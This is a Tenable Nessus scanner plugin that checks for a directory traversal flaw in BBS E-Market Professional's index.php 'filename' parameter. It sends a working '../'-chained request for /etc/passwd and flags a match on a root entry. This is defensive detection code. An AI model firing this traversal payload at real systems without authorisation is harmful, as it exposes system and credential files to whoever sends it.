#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(14786);
 script_bugtraq_id(11191);
 script_xref(name:"OSVDB", value:"10053");
 script_version("$Revision: 1.6 $");

 script_name(english:"BBS E-Market Professional index.php filename Variable Traversal Arbitrary File Access");
 script_summary(english:"Directory Traversal Attempt");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a directory\n",
     "traversal vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running BBS E-Market Professional, a Korean\n",
     "e-commerce application written in PHP.\n\n",
     "There is a directory traversal vulnerability in the 'filename'\n",
     "parameter of '/bemarket/shop/index.php'.  A remote attacker could\n",
     "exploit this to read sensitive information on the system."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/fulldisclosure/2004-09/0494.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to BBS E-Market Professional 1.4.0 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 family["english"] = "CGI abuses";
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");

 script_family(english:family["english"]);
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

# Check starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if ( ! can_host_php(port:port) ) exit(0);


foreach dir (cgi_dirs()) 
 {
  traversal = '../../../../../../../../../../../../../../etc/passwd';
  url = string(
    dir,
    '/bemarket/shop/index.php?pageurl=viewpage&filename=', traversal
  );
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  if ( egrep(pattern:"root:.*:0:[01]:.*", string:res[2]))
	{
	 security_warning(port);
	 exit(0);
	}
 }
